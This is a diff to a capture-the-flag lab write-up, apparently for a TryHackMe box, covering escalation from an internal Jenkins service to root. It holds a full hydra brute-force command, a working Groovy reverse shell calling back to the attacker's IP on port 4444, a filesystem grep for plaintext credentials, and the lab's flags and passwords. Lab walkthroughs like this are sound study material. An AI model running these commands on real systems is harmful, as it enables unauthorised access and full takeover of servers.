@@ -37,5 +37,30 @@
 		- user flag = **THM{int3rna1_fl4g_1}**
 6. esclate to root:
 	-  found jenkins service running on internal host at 172.17.0.2:8080
-	-  ... 
+	- confirm host is internal: `netstat -nat` -- running on 127.0.0.1:8080
+	-  setup SSH tunnel to access this internal host: `ssh -L 127.0.0.1:9999:127.0.0.1:8080 aubreanna@10.10.196.99` -> [password]
+	-  navigate to Jenkins in browser: `http://127.0.0.1:8080`
+		- try default jenkins login passwords -- failed 
+	- capture request in Burp 
+	- Try to brute force login:
+		- `hydra 127.0.0.1 -s 9999 http-post-form '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username' -l admin -P /usr/share/wordlists/rockyou.txt -f`
+		- found credentials: "admin:spongebob"
+	- login to Jenkins services and upload a shell:
+		- navigate to `127.0.0.1:9999/computer/(master)/script`
+		- create a Groovy script bash reverse shell in textbox:
+		```groovy
+		String host="10.11.31.198";
+		int port=4444;String cmd="bash";
+		Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+		```
+		- setup netcat listener and run 
+	-  search for plaintext credentials (found previously) with: `grep -r "credentials" / 2> /dev/nul`
+		-  found "/opt/note.txt"
+		- contains credentails "root:tr0ub13guM!@#123"
+	- login to root account and get root flag:
+		- `su root` -> [password]
+		- `cat /root/root.txt`
+		- root flag = **THM{d0ck3r_d3str0y3r}**
+
+
 
